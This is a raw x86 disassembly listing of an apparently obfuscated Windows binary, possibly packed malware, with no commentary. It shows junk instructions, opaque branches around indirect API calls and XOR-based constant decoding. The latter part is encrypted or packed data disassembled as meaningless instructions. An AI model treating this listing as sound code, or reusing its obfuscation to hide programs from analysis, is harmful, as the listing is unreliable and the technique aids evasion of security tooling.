  415a13:	push   esi
  415a14:	push   edi
  415a15:	or     DWORD PTR ds:0x428377,0x412a
  415a1f:	mov    eax,DWORD PTR [ebp+0x8]
  415a22:	cmp    DWORD PTR ds:0x42820b,0x0
  415a29:	mov    ebx,0x3b8c
  415a2e:	mov    DWORD PTR ds:0x42816b,0x632c
  415a38:	jmp    0x415aab
  415a3d:	mov    edx,0x517f
  415a42:	mov    edi,DWORD PTR ds:0x4282cf
  415a48:	cmp    DWORD PTR ds:0x42820b,0x0
  415a4f:	jae    0x415a95
  415a55:	push   DWORD PTR [ebp-0x14]
  415a58:	push   DWORD PTR [ebp-0x1c]
  415a5b:	push   DWORD PTR [ebp-0x18]
  415a5e:	push   DWORD PTR [ebp-0x18]
  415a61:	push   0x4a1d
  415a66:	push   0x1f83
  415a6b:	push   DWORD PTR [ebp-0x14]
  415a6e:	call   DWORD PTR ds:0x428ec4
  415a74:	mov    edi,DWORD PTR ds:0x42819f
  415a7a:	xor    ecx,ecx
  415a7c:	or     ecx,DWORD PTR ds:0x4281bf
  415a82:	sub    edi,ecx
  415a84:	imul   edi,DWORD PTR [edi+ecx*1]
  415a88:	movzx  edx,WORD PTR ds:0x428157
  415a8f:	and    DWORD PTR ds:0x428383,edx
  415a95:	xor    DWORD PTR ds:0x428223,0x17b
  415a9f:	sbb    DWORD PTR ds:0x4282d7,ecx
  415aa5:	adc    DWORD PTR ds:0x42814b,edi
  415aab:	mov    ecx,DWORD PTR [ebp+0xc]
  415aae:	shrd   eax,ecx,0x2
  415ab2:	shr    ecx,0x2
  415ab5:	mov    ecx,DWORD PTR [ebp+0x8]
  415ab8:	and    edi,0x5809
  415abe:	mov    edx,DWORD PTR [ebp+0xc]
  415ac1:	mov    edi,DWORD PTR ds:0x428153
  415ac7:	xor    DWORD PTR ds:0x42827f,edi
  415acd:	xor    edx,edx
  415acf:	xor    ebx,ebx
  415ad1:	xor    ebx,DWORD PTR ds:0x4281cf
  415ad7:	xor    edi,edi
  415ad9:	or     edi,DWORD PTR ds:0x42828b
  415adf:	sub    ebx,edi
  415ae1:	or     ebx,DWORD PTR [ebx+edi*1]
  415ae4:	mov    esi,0x329e695d
  415ae9:	xor    eax,esi
  415aeb:	adc    ebx,0x4305
  415af1:	or     eax,edx
  415af3:	mov    DWORD PTR [ebp-0x28],eax
  415af6:	not    edx
  415af8:	mov    eax,DWORD PTR [ebp+0x8]
  415afb:	sbb    DWORD PTR ds:0x428363,edx
  415b01:	shl    ecx,0x1e
  415b04:	mov    ecx,DWORD PTR [ebp+0xc]
  415b07:	shrd   eax,ecx,0x2
  415b0b:	adc    ebx,0x5b1c
  415b11:	xor    eax,esi
  415b13:	shr    ecx,0x2
  415b16:	sbb    DWORD PTR ds:0x42822f,ecx
  415b1c:	mov    ecx,DWORD PTR [ebp+0x8]
  415b1f:	mov    edi,DWORD PTR ds:0x4281af
  415b25:	mov    edx,DWORD PTR ds:0x4281ff
  415b2b:	sub    edx,edi
  415b2d:	and    edi,DWORD PTR [edi+edx*1]
  415b30:	mov    edx,DWORD PTR [ebp+0xc]
  415b33:	cmp    DWORD PTR ds:0x42836f,0x0
  415b3a:	not    DWORD PTR ds:0x4282f3
  415b40:	mov    DWORD PTR ds:0x42824b,0x4d0
  415b4a:	mov    DWORD PTR ds:0x428143,0x25d8
  415b54:	jmp    0x415ba8
  415b59:	mov    DWORD PTR ds:0x428353,0x25ca
  415b63:	cmp    DWORD PTR ds:0x42836f,0x0
  415b6a:	jge    0x415b90
  415b70:	push   DWORD PTR [ebp-0x28]
  415b73:	push   0x42813b
  415b78:	push   0x12d6
  415b7d:	call   DWORD PTR ds:0x428e5c
  415b83:	add    DWORD PTR ds:0x42834b,0x4989
  415b8d:	inc    edi
  415b8e:	add    edi,ebx
  415b90:	sbb    DWORD PTR ds:0x4282ff,0x655f
  415b9a:	mov    ebx,DWORD PTR ds:0x4282cb
  415ba0:	adc    DWORD PTR ds:0x428307,ebx
  415ba6:	xor    edi,edi
  415ba8:	xor    edx,edx
  415baa:	add    ebx,edi
  415bac:	or     eax,edx
  415bae:	cmp    DWORD PTR ds:0x42815f,0x0
  415bb5:	mov    DWORD PTR ds:0x428157,0x74bf
  415bbf:	mov    DWORD PTR ds:0x4282d7,0x4195
  415bc9:	jmp    0x415c2e
  415bce:	mov    ebx,0x25c0
  415bd3:	mov    ebx,0x1763
  415bd8:	cmp    DWORD PTR ds:0x42815f,0x0
  415bdf:	jl     0x415c13
  415be5:	push   0x432b
  415bea:	push   0x428237
  415bef:	call   DWORD PTR ds:0x428e60
  415bf5:	sub    edi,DWORD PTR ds:0x428383
  415bfb:	sbb    DWORD PTR ds:0x428307,ecx
  415c01:	and    edx,DWORD PTR ds:0x428177
  415c07:	mov    edi,DWORD PTR ds:0x42821f
  415c0d:	and    DWORD PTR ds:0x42815b,edi
  415c13:	or     DWORD PTR ds:0x428153,0x73d6
  415c1d:	mov    edi,DWORD PTR ds:0x428183
  415c23:	mov    edx,DWORD PTR ds:0x42830b
  415c29:	sub    edi,edx
  415c2b:	xor    edi,DWORD PTR [edi+edx*1]
  415c2e:	mov    DWORD PTR [ebp-0x28],eax
  415c31:	cmp    DWORD PTR ds:0x42834f,0x0
  415c38:	mov    DWORD PTR ds:0x42837b,ebx
  415c3e:	mov    DWORD PTR ds:0x42814f,ecx
  415c44:	jmp    0x415cab
  415c49:	mov    DWORD PTR ds:0x42816b,edx
  415c4f:	cmp    DWORD PTR ds:0x42834f,0x0
  415c56:	jbe    0x415ca1
  415c5c:	push   0x6725
  415c61:	push   0x4282eb
  415c66:	push   0x8698
  415c6b:	push   0x6e02
  415c70:	push   0x538f
  415c75:	push   DWORD PTR [ebp-0x24]
  415c78:	push   0x8d72
  415c7d:	push   0x8325
  415c82:	call   DWORD PTR ds:0x428db0
  415c88:	mov    edi,DWORD PTR ds:0x4281a7
  415c8e:	mov    edx,DWORD PTR ds:0x42832f
  415c94:	sub    edi,edx
  415c96:	sub    edi,DWORD PTR [edi+edx*1]
  415c99:	add    DWORD PTR ds:0x428307,ebx
  415c9f:	or     edx,ebx
  415ca1:	add    edx,edi
  415ca3:	or     ebx,ebx
  415ca5:	and    ebx,DWORD PTR ds:0x42821f
  415cab:	mov    eax,ds:0x4223b8
  415cb0:	xor    edx,0x5bba
  415cb6:	mov    eax,DWORD PTR [eax]
  415cb8:	or     ebx,edx
  415cba:	mov    DWORD PTR [ebp-0xc],eax
  415cbd:	and    edi,0x77ac
  415cc3:	mov    eax,ds:0x4225d8
  415cc8:	mov    eax,DWORD PTR [eax]
  415cca:	cmp    DWORD PTR ds:0x42836b,0x0
  415cd1:	mov    edi,DWORD PTR ds:0x42825b
  415cd7:	mov    ebx,DWORD PTR ds:0x428383
  415cdd:	mov    DWORD PTR ds:0x428223,0x6f52
  415ce7:	jmp    0x415d31
  415cec:	mov    DWORD PTR ds:0x42835b,0x23d0
  415cf6:	cmp    DWORD PTR ds:0x42836b,0x0
  415cfd:	ja     0x415d21
  415d03:	push   DWORD PTR [ebp-0x18]
  415d06:	push   0x1c98
  415d0b:	push   DWORD PTR [ebp-0x1c]
  415d0e:	push   DWORD PTR [ebp-0xc]
  415d11:	call   DWORD PTR ds:0x428db4
  415d17:	or     ebx,edx
  415d19:	or     edx,edi
  415d1b:	adc    edi,0x39b9
  415d21:	and    edx,DWORD PTR ds:0x428247
  415d27:	sbb    edx,edi
  415d29:	add    edx,edi
  415d2b:	sbb    ebx,0x45bb
  415d31:	mov    DWORD PTR [ebp-0x10],eax
  415d34:	xor    DWORD PTR ds:0x42825f,0x428243
  415d3e:	mov    eax,DWORD PTR [ebp-0xc]
  415d41:	sbb    DWORD PTR ds:0x4282ef,0x4085
  415d4b:	mov    eax,DWORD PTR [ebp-0xc]
  415d4e:	mov    ebx,DWORD PTR [ebp+0x8]
  415d51:	cmp    DWORD PTR ds:0x428307,0x0
  415d58:	mov    DWORD PTR ds:0x428263,0x5216
  415d62:	not    DWORD PTR ds:0x42823b
  415d68:	mov    edi,0x3d1c
  415d6d:	mov    DWORD PTR ds:0x42825b,0x4705
  415d77:	jmp    0x415dc1
  415d7c:	mov    DWORD PTR ds:0x42827b,ebx
  415d82:	cmp    DWORD PTR ds:0x428307,0x0
  415d89:	jg     0x415da3
  415d8f:	push   0x42809b
  415d94:	push   0x428049
  415d99:	call   DWORD PTR ds:0x428db8
  415d9f:	and    edx,edx
  415da1:	sub    edi,edi
  415da3:	xor    edx,edx
  415da5:	xor    edx,DWORD PTR ds:0x42825f
  415dab:	sbb    DWORD PTR ds:0x428383,edx
  415db1:	or     DWORD PTR ds:0x428363,ebx
  415db7:	sbb    DWORD PTR ds:0x428283,0x12ba
  415dc1:	shl    ecx,0x1e
  415dc4:	xor    ecx,ecx
  415dc6:	adc    DWORD PTR ds:0x4282ff,ecx
  415dcc:	shld   ecx,eax,0x2
  415dd0:	shl    eax,0x2
  415dd3:	mov    edi,0xca79a575
  415dd8:	mov    edx,0x9c1b89e8
  415ddd:	or     DWORD PTR ds:0x42813f,0x4c83
  415de7:	mov    DWORD PTR [ebp-0x38],ebx
  415dea:	mov    ebx,DWORD PTR [ebp+0xc]
  415ded:	xor    DWORD PTR ds:0x428137,0x6279
  415df7:	xor    eax,edi
  415df9:	sub    DWORD PTR ds:0x42817b,0x428143
  415e03:	xor    ecx,edx
  415e05:	mov    DWORD PTR ds:0x42817b,0x1398
  415e0f:	mov    DWORD PTR [ebp-0x1c],0xa4069bae
  415e16:	mov    DWORD PTR ds:0x42834f,0x5e42
  415e20:	mov    DWORD PTR [ebp-0x18],0xa40692ae
  415e27:	mov    DWORD PTR [ebp-0x34],ebx
  415e2a:	mov    DWORD PTR ds:0x428257,0x218e
  415e34:	cmp    eax,DWORD PTR [ebp-0x38]
  415e37:	mov    DWORD PTR ds:0x428283,0x534
  415e41:	jne    0x415e59
  415e47:	mov    DWORD PTR ds:0x42822f,0x12af
  415e51:	cmp    ecx,ebx
  415e53:	je     0x416649
  415e59:	mov    eax,DWORD PTR [ebp-0x10]
  415e5c:	adc    DWORD PTR ds:0x42825f,edx
  415e62:	mov    eax,DWORD PTR [ebp-0x10]
  415e65:	xor    ecx,ecx
  415e67:	shld   ecx,eax,0x2
  415e6b:	and    DWORD PTR ds:0x4282e7,0x42816f
  415e75:	shl    eax,0x2
  415e78:	xor    ecx,edx
  415e7a:	cmp    DWORD PTR ds:0x428153,0x0
  415e81:	not    edx
  415e83:	mov    DWORD PTR ds:0x4282ff,edx
  415e89:	mov    edx,0x6413
  415e8e:	jmp    0x415f0c
  415e93:	mov    DWORD PTR ds:0x42816f,0x1988
  415e9d:	mov    DWORD PTR ds:0x428277,0x1d2b
  415ea7:	cmp    DWORD PTR ds:0x428153,0x0
  415eae:	je     0x415ee8
  415eb4:	push   0x6b61
  415eb9:	push   0x4c93
  415ebe:	call   DWORD PTR ds:0x428dbc
  415ec4:	or     DWORD PTR ds:0x428213,0x4f44
  415ece:	or     edx,0x2695
  415ed4:	sub    DWORD PTR ds:0x42834b,0x174
  415ede:	mov    DWORD PTR ds:0x42836f,0x41a3
  415ee8:	mov    edx,DWORD PTR ds:0x42836b
  415eee:	add    edx,DWORD PTR ds:0x42814f
  415ef4:	mov    DWORD PTR ds:0x42836b,edx
  415efa:	or     DWORD PTR ds:0x428357,ecx
  415f00:	mov    edx,DWORD PTR ds:0x428307
  415f06:	or     DWORD PTR ds:0x428267,edx
  415f0c:	mov    edx,DWORD PTR [ebp+0x8]
  415f0f:	xor    eax,edi
  415f11:	mov    DWORD PTR ds:0x428277,ecx
  415f17:	mov    edi,DWORD PTR [ebp+0xc]
  415f1a:	cmp    eax,edx
  415f1c:	jne    0x415f34
  415f22:	cmp    ecx,edi
  415f24:	mov    DWORD PTR ds:0x4282ff,0x9a6
  415f2e:	je     0x416649
  415f34:	cmp    DWORD PTR ds:0x428133,0x0
  415f3b:	mov    DWORD PTR ds:0x428157,0x3be3
  415f45:	movzx  ebx,WORD PTR ds:0x428357
  415f4c:	not    edi
  415f4e:	jmp    0x415fba
  415f53:	mov    DWORD PTR ds:0x4282f7,ebx
  415f59:	cmp    DWORD PTR ds:0x428133,0x0
  415f60:	jne    0x415fad
  415f66:	push   0x3f61
  415f6b:	push   0x3f0f
  415f70:	push   DWORD PTR [ebp-0x18]
  415f73:	push   0x84fe
  415f78:	push   DWORD PTR [ebp-0x18]
  415f7b:	push   DWORD PTR [ebp-0x10]
  415f7e:	push   0x689e
  415f83:	push   DWORD PTR [ebp-0x18]
  415f86:	push   0x8af6
  415f8b:	call   DWORD PTR ds:0x428ec8
  415f91:	xor    DWORD PTR ds:0x428387,edx
  415f97:	sbb    edi,DWORD PTR ds:0x428263
  415f9d:	sub    DWORD PTR ds:0x42821f,0x4f5e
  415fa7:	sub    ecx,DWORD PTR ds:0x42835b
  415fad:	add    edi,0xe71
  415fb3:	dec    ecx
  415fb4:	and    ecx,DWORD PTR ds:0x428303
  415fba:	mov    eax,DWORD PTR [ebp-0x18]
  415fbd:	and    DWORD PTR ds:0x428353,ebx
  415fc3:	mov    ecx,DWORD PTR [ebp-0x18]
  415fc6:	push   0xfffffffe
  415fc8:	pop    ebx
  415fc9:	and    DWORD PTR ds:0x42816b,0xd25
  415fd3:	xor    ecx,ebx
  415fd5:	movzx  edi,BYTE PTR ds:0x42816b
  415fdc:	add    DWORD PTR ds:0x428253,edi
  415fe2:	shl    ecx,0x1e
  415fe5:	cmp    DWORD PTR ds:0x42821f,0x0
  415fec:	mov    DWORD PTR ds:0x428373,ecx
  415ff2:	mov    edi,0x37d1
  415ff7:	mov    DWORD PTR ds:0x428387,0x730b
  416001:	mov    edi,0x60e5
  416006:	jmp    0x416062
  41600b:	mov    DWORD PTR ds:0x428353,0x1cd3
  416015:	mov    DWORD PTR ds:0x42814f,0x4bc0
  41601f:	cmp    DWORD PTR ds:0x42821f,0x0
  416026:	jg     0x41603f
  41602c:	push   0x1ec5
  416031:	call   DWORD PTR ds:0x428ecc
  416037:	add    DWORD PTR ds:0x428153,edx
  41603d:	neg    edi
  41603f:	mov    DWORD PTR ds:0x4282f7,0x2c32
  416049:	and    edi,DWORD PTR ds:0x42822f
  41604f:	and    edi,0x1973
  416055:	movzx  edi,WORD PTR ds:0x428227
  41605c:	adc    DWORD PTR ds:0x42824b,edi
  416062:	mov    edi,0xa4069aaf
  416067:	and    DWORD PTR ds:0x42837b,0x1058
  416071:	xor    eax,edi
  416073:	sub    DWORD PTR ds:0x4282e7,0x42825f
  41607d:	shr    eax,0x2
  416080:	or     eax,ecx
  416082:	cmp    DWORD PTR ds:0x42816f,0x0
  416089:	mov    DWORD PTR ds:0x428307,0x1e83
  416093:	mov    DWORD PTR ds:0x428363,edx
  416099:	movzx  ecx,WORD PTR ds:0x42823b
  4160a0:	jmp    0x4160ed
  4160a5:	not    ecx
  4160a7:	mov    ecx,DWORD PTR ds:0x428173
  4160ad:	cmp    DWORD PTR ds:0x42816f,0x0
  4160b4:	jg     0x4160e2
  4160ba:	push   DWORD PTR [ebp-0x20]
  4160bd:	push   DWORD PTR [ebp-0x18]
  4160c0:	call   DWORD PTR ds:0x428dc0
  4160c6:	adc    DWORD PTR ds:0x4282fb,edi
  4160cc:	or     DWORD PTR ds:0x42823b,0x4a59
  4160d6:	mov    ecx,DWORD PTR ds:0x42820f
  4160dc:	sub    DWORD PTR ds:0x42816b,ecx
  4160e2:	add    DWORD PTR ds:0x42825f,0x16e5
  4160ec:	dec    ecx
  4160ed:	mov    DWORD PTR [ebp-0x34],eax
  4160f0:	mov    eax,ds:0x422538
  4160f5:	and    ecx,DWORD PTR ds:0x42824f
  4160fb:	mov    DWORD PTR [ebp-0x34],eax
  4160fe:	mov    eax,DWORD PTR [ebp-0xc]
  416101:	mov    DWORD PTR [ebp-0x14],eax
  416104:	xor    DWORD PTR ds:0x42835b,ecx
  41610a:	mov    ecx,DWORD PTR [ebp-0x14]
  41610d:	or     DWORD PTR ds:0x428373,0x5817
  416117:	push   0x4
  416119:	cmp    DWORD PTR ds:0x42816b,0x0
  416120:	mov    DWORD PTR ds:0x428353,0x7b16
  41612a:	mov    DWORD PTR ds:0x42816f,0x195b
  416134:	jmp    0x41618b
  416139:	mov    DWORD PTR ds:0x42824b,0x5f2a
  416143:	cmp    DWORD PTR ds:0x42816b,0x0
  41614a:	jle    0x41616d
  416150:	push   DWORD PTR [ebp-0x20]
  416153:	call   DWORD PTR ds:0x428ed0
  416159:	xor    DWORD PTR ds:0x428147,0x42813b
  416163:	sub    DWORD PTR ds:0x428133,0x42815f
  41616d:	sbb    DWORD PTR ds:0x42826f,0x428267
  416177:	and    DWORD PTR ds:0x42825f,0x56d1
  416181:	xor    DWORD PTR ds:0x42824b,0x1431
  41618b:	pop    eax
  41618c:	or     DWORD PTR ds:0x42823f,0x42817b
  416196:	sub    eax,ecx
  416198:	mov    ecx,DWORD PTR [ebp-0x10]
  41619b:	add    ecx,eax
  41619d:	mov    DWORD PTR [ebp-0x24],ecx
  4161a0:	mov    ecx,DWORD PTR ds:0x4281ef
  4161a6:	mov    ecx,DWORD PTR [ecx]
  4161a8:	sbb    DWORD PTR ds:0x428173,ecx
  4161ae:	lea    eax,[ebp-0x30]
  4161b1:	mov    DWORD PTR [ebp-0x2c],eax
  4161b4:	and    eax,0x1e1b
  4161b9:	mov    eax,DWORD PTR [ebp-0x1c]
  4161bc:	mov    ecx,DWORD PTR [ebp-0x1c]
  4161bf:	xor    eax,edi
  4161c1:	xor    ecx,ebx
  4161c3:	sub    DWORD PTR ds:0x42816b,0x428247
  4161cd:	shr    eax,0x2
  4161d0:	and    DWORD PTR ds:0x42826b,0x42822b
  4161da:	shl    ecx,0x1e
  4161dd:	sbb    DWORD PTR ds:0x4282f7,0x42820b
  4161e7:	or     eax,ecx
  4161e9:	or     DWORD PTR ds:0x428263,0x697f
  4161f3:	mov    DWORD PTR [ebp-0x20],eax
  4161f6:	mov    DWORD PTR [ebp-0x8],0xa4069abe
  4161fd:	mov    eax,DWORD PTR [ebp-0x8]
  416200:	mov    ecx,DWORD PTR [ebp-0x8]
  416203:	xor    eax,edi
  416205:	xor    ecx,ebx
  416207:	shr    eax,0x2
  41620a:	shl    ecx,0x1e
  41620d:	or     ecx,eax
  41620f:	push   ecx
  416210:	lea    eax,[ebp-0x8]
  416213:	push   eax
  416214:	lea    eax,[ebp-0x7c]
  416217:	push   eax
  416218:	call   0x415231
  41621d:	mov    eax,DWORD PTR [ebp-0x8]
  416220:	mov    ecx,DWORD PTR [ebp-0x8]
  416223:	xor    eax,edi
  416225:	xor    ecx,ebx
  416227:	shr    eax,0x2
  41622a:	shl    ecx,0x1e
  41622d:	or     ecx,eax
  41622f:	push   ecx
  416230:	lea    eax,[ebp-0x14]
  416233:	push   eax
  416234:	mov    eax,DWORD PTR [ebp+0x8]
  416237:	mov    ecx,DWORD PTR [ebp+0xc]
  41623a:	shrd   eax,ecx,0x2
  41623e:	shr    ecx,0x2
  416241:	mov    ecx,DWORD PTR [ebp+0x8]
  416244:	mov    edx,DWORD PTR [ebp+0xc]
  416247:	xor    eax,esi
  416249:	xor    edx,edx
  41624b:	or     eax,edx
  41624d:	lea    eax,[ebp+eax*4-0x78]
  416251:	push   eax
  416252:	shl    ecx,0x1e
  416255:	call   0x415231
  41625a:	mov    eax,DWORD PTR [ebp-0x8]
  41625d:	mov    ecx,DWORD PTR [ebp-0x8]
  416260:	xor    eax,edi
  416262:	xor    ecx,ebx
  416264:	shr    eax,0x2
  416267:	shl    ecx,0x1e
  41626a:	or     ecx,eax
  41626c:	push   ecx
  41626d:	lea    eax,[ebp-0x24]
  416270:	push   eax
  416271:	mov    eax,DWORD PTR [ebp+0x10]
  416274:	mov    ecx,DWORD PTR [ebp+0x14]
  416277:	shrd   eax,ecx,0x2
  41627b:	shr    ecx,0x2
  41627e:	mov    ecx,DWORD PTR [ebp+0x10]
  416281:	mov    edx,DWORD PTR [ebp+0x14]
  416284:	xor    eax,esi
  416286:	xor    edx,edx
  416288:	or     eax,edx
  41628a:	lea    eax,[ebp+eax*4-0x78]
  41628e:	push   eax
  41628f:	shl    ecx,0x1e
  416292:	call   0x415231
  416297:	mov    eax,DWORD PTR [ebp-0x8]
  41629a:	mov    ecx,DWORD PTR [ebp-0x8]
  41629d:	xor    ecx,ebx
  41629f:	xor    eax,edi
  4162a1:	shl    ecx,0x1e
  4162a4:	shr    eax,0x2
  4162a7:	or     ecx,eax
  4162a9:	push   ecx
  4162aa:	lea    eax,[ebp-0x20]
  4162ad:	push   eax
  4162ae:	mov    eax,DWORD PTR [ebp+0x10]
  4162b1:	mov    ecx,DWORD PTR [ebp+0x14]
  4162b4:	shrd   eax,ecx,0x2
  4162b8:	shr    ecx,0x2
  4162bb:	mov    ecx,DWORD PTR [ebp+0x10]
  4162be:	mov    edx,DWORD PTR [ebp+0x14]
  4162c1:	xor    edx,edx
  4162c3:	xor    eax,esi
  4162c5:	or     eax,edx
  4162c7:	shl    ecx,0x1e
  4162ca:	mov    ecx,DWORD PTR [ebp+0x10]
  4162cd:	mov    edx,DWORD PTR [ebp+0x14]
  4162d0:	shrd   ecx,edx,0x2
  4162d4:	shr    edx,0x2
  4162d7:	mov    edx,DWORD PTR [ebp+0x10]
  4162da:	mov    ebx,DWORD PTR [ebp+0x14]
  4162dd:	xor    ecx,esi
  4162df:	xor    ebx,ebx
  4162e1:	or     ecx,ebx
  4162e3:	add    eax,ecx
  4162e5:	lea    eax,[ebp+eax*4-0x78]
  4162e9:	push   eax
  4162ea:	shl    edx,0x1e
  4162ed:	call   0x415231
  4162f2:	mov    eax,DWORD PTR [ebp-0x8]
  4162f5:	mov    ecx,DWORD PTR [ebp-0x8]
  4162f8:	xor    ecx,0xfffffffe
  4162fb:	shl    ecx,0x1e
  4162fe:	jmp    0x41655e
  416303:	sbb    eax,0x26add60b
  416308:	lods   eax,DWORD PTR ds:[esi]
  416309:	sbb    bh,BYTE PTR [edx-0x45]
  41630c:	xor    bl,BYTE PTR [ebx+0x70]
  41630f:	scas   al,BYTE PTR es:[edi]
  416310:	dec    esi
  416311:	jmp    0x164257c0
  416316:	sbb    BYTE PTR [ebx+0x29181814],bl
  41631c:	or     BYTE PTR [edi+0x29],cl
  41631f:	sbb    al,cl
  416321:	jmp    0x4162fd
  416323:	pop    eax
  416324:	and    ebx,DWORD PTR [edi+0x58]
  416327:	adc    cl,dh
  416329:	inc    ebp
  41632a:	xor    bl,dl
  41632c:	cmp    eax,0x3b892cdb
  416331:	lock push ecx
  416333:	mov    DWORD PTR [si+0x6b26],ecx
  416338:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416339:	push   es
  41633a:	shl    BYTE PTR [eax+ebp*2+0x6d0bcda0],cl
  416341:	bound  eax,QWORD PTR [esi+0x6709d17e]
  416347:	adc    BYTE PTR [eax],cl
  416349:	cli    
  41634a:	mov    ch,BYTE PTR [ebx-0x4e]
  41634d:	shl    DWORD PTR [ebx-0x1d16d96c],1
  416353:	add    al,0xfe
  416355:	(bad)  
  416356:	xchg   edi,eax
  416357:	pop    ecx
  416358:	test   eax,0xdc245de2
  41635d:	jl     0x41635f
  41635f:	and    al,0x11
  416361:	cmp    eax,0x718219be
  416366:	mov    dl,0x71
  416368:	out    dx,eax
  416369:	ja     0x416377
  41636b:	fnstsw WORD PTR ss:[ebp+0x43]
  41636f:	sub    eax,DWORD PTR [esi+esi*2+0x5a]
  416373:	test   eax,0x60cadc01
  416378:	icebp  
  416379:	cmc    
  41637a:	mov    ecx,0xb8e35a5b
  41637f:	adc    BYTE PTR [ebp+edx*1-0x11],al
  416383:	inc    edi
  416384:	sub    eax,0x5b1cbe69
  416389:	push   ebp
  41638a:	arpl   WORD PTR [eax],ax
  41638c:	pop    ebx
  41638d:	in     eax,0x38
  41638f:	xchg   ecx,eax
  416390:	std    
  416391:	push   es
  416392:	push   ds
  416393:	push   cs
  416394:	fwait
  416395:	inc    ebp
  416396:	addr16 fwait
  416398:	jno    0x4163f1
  41639a:	popa   
  41639b:	ds jecxz 0x416370
  41639e:	icebp  
  41639f:	dec    ebp
  4163a0:	bound  edx,QWORD PTR [eax-0x2c]
  4163a3:	push   ss
  4163a4:	sub    eax,0xad21fb20
  4163a9:	in     al,dx
  4163aa:	cmp    cl,BYTE PTR [edi+edx*8-0x2a]
  4163ae:	push   eax
  4163af:	int    0x4d
  4163b1:	push   cs
  4163b2:	gs jo  0x41642c
  4163b5:	xchg   ebp,edx
  4163b7:	and    al,0xa0
  4163b9:	sub    eax,0xffd076b7
  4163be:	or     al,0xab
  4163c0:	push   ds
  4163c1:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4163c3:	adc    eax,0xb38221c1
  4163c8:	xchg   ebx,eax
  4163c9:	mov    DWORD PTR [ebx+0x785b1d80],0x89e4f549
  4163d3:	xor    ebp,edx
  4163d5:	lods   al,BYTE PTR ds:[esi]
  4163d6:	and    esi,0x7f2882fd
  4163dc:	pop    ss
  4163dd:	jno    0x4163b5
  4163df:	icebp  
  4163e0:	mov    esi,0x3e124f4a
  4163e5:	mov    WORD PTR [eax-0x2a],ds
  4163e8:	lds    eax,FWORD PTR [eax-0x485665da]
  4163ee:	pop    eax
  4163ef:	xor    al,0xc8
  4163f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163f2:	mov    al,0xd5
  4163f4:	push   ebp
  4163f5:	xor    BYTE PTR [edi-0x36],ch
  4163f8:	or     al,0xab
  4163fa:	and    DWORD PTR [eax-0xb],eax
  4163fd:	mov    eax,0xd5cf0f77
  416402:	jge    0x416384
  416404:	mov    ah,0xb6
  416406:	popf   
  416407:	pop    ds
  416408:	jecxz  0x416463
  41640a:	fild   DWORD PTR [eax-0x6e51f35b]
  416410:	mov    ah,0x6d
  416412:	ret    
  416413:	int3   
  416414:	arpl   WORD PTR [edx],sp
  416416:	popf   
  416417:	test   eax,0xe3d3c6e
  41641c:	cmp    eax,0x49aeaed8
  416421:	dec    ebp
  416422:	pop    edx
  416423:	test   eax,0x71356c3f
  416428:	test   al,0x20
  41642a:	pop    eax
  41642b:	sbb    ebp,ebx
  41642d:	sbb    ebp,DWORD PTR [ebx]
  41642f:	push   ecx
  416430:	int3   
  416431:	xlat   BYTE PTR ds:[ebx]
  416432:	je     0x416439
  416434:	retf   0x7c8
  416437:	pop    esp
  416438:	or     DWORD PTR [esi-0x21],ebp
  41643b:	push   esi
  41643c:	fsqrt  
  41643e:	mov    eax,ds:0x90c23121
  416443:	shr    DWORD PTR [ebx],1
  416445:	xchg   ebx,eax
  416446:	jbe    0x4163fd
  416448:	cmp    BYTE PTR [ebp+0x17],cl
  41644b:	push   ebx
  41644c:	pop    edx
  41644d:	push   ds
  41644e:	or     ebx,eax
  416450:	imul   DWORD PTR [ebp+0x75]
  416453:	and    BYTE PTR [ebp-0x18],al
  416456:	imul   edi,DWORD PTR [edi-0x22058eef],0xffffffd5
  41645d:	cmc    
  41645e:	out    dx,eax
  41645f:	jg     0x4164a7
  416461:	leave  
  416462:	sub    esp,DWORD PTR [edx+0x0]
  416465:	xlat   BYTE PTR ds:[ebx]
  416466:	js     0x4164d3
  416468:	jmp    0x98668a0
  41646d:	jne    0x416408
  41646f:	aam    0xef
  416471:	cmp    dl,BYTE PTR [ecx]
  416473:	and    cl,BYTE PTR [edi]
  416475:	cs clc 
  416477:	mov    edx,0x20f01289
  41647c:	jne    0x4164ee
  41647e:	cdq    
  41647f:	push   0x15238aef
  416484:	lods   eax,DWORD PTR ds:[esi]
  416485:	fs stos DWORD PTR es:[edi],eax
  416487:	dec    ebp
  416488:	jnp    0x41642f
  41648a:	shl    BYTE PTR ds:0x95a4ce9f,0xe
  416491:	sbb    DWORD PTR [ebx-0x36],ecx
  416494:	push   cs
  416495:	mov    ebp,0xbe918161
  41649a:	sub    bl,bh
  41649c:	pop    ds
  41649d:	call   FWORD PTR [ebx-0x56]
  4164a0:	inc    eax
  4164a1:	lods   eax,DWORD PTR ds:[esi]
  4164a2:	loopne 0x416507
  4164a4:	sub    eax,esp
  4164a6:	inc    BYTE PTR ds:0xcada962c
  4164ac:	xor    DWORD PTR [ecx-0x3b6b9d9b],ebp
  4164b2:	(bad)  
  4164b3:	add    ebx,DWORD PTR [ebp-0x67]
  4164b6:	and    ah,BYTE PTR [ecx+edx*2]
  4164b9:	mov    ds:0x78fcf4e9,eax
  4164be:	call   0xb3bb1b50
  4164c3:	ds retf 0x4032
  4164c7:	jbe    0x416506
  4164c9:	or     ecx,DWORD PTR [ecx]
  4164cb:	aam    0x8c
  4164cd:	push   ss
  4164ce:	rcl    BYTE PTR [edx+0x22405453],1
  4164d4:	jmp    0xcd0b:0x6e3abb84
  4164db:	inc    esp
  4164dc:	add    al,0x70
  4164de:	mov    ds:0xa996c69a,al
  4164e3:	arpl   WORD PTR [esi-0x751b562a],si
  4164e9:	cmp    eax,0xe39e4356
  4164ee:	jg     0x4164a8
  4164f0:	mov    ebx,0xb9dd2902
  4164f5:	(bad)  
  4164f6:	call   0xd764:0x1b64b8a1
  4164fd:	push   ecx
  4164fe:	and    al,0x93
  416500:	ror    BYTE PTR [ebx-0x4849e26c],0xb4
  416507:	ret    0x4759
  41650a:	jecxz  0x416577
  41650c:	xor    edx,DWORD PTR [edx]
  41650e:	sbb    al,0xc1
  416510:	pusha  
  416511:	adc    BYTE PTR [edx-0x4a],bl
  416514:	test   al,0x70
  416516:	jmp    DWORD PTR [esi+edx*4+0x12]
  41651a:	mov    ds:0x46445e8e,eax
  41651f:	and    esp,DWORD PTR [edi]
  416521:	cdq    
  416522:	mov    bl,BYTE PTR [edi]
  416524:	jbe    0x4164b8
  416526:	add    eax,0x777e4e09
  41652b:	push   esi
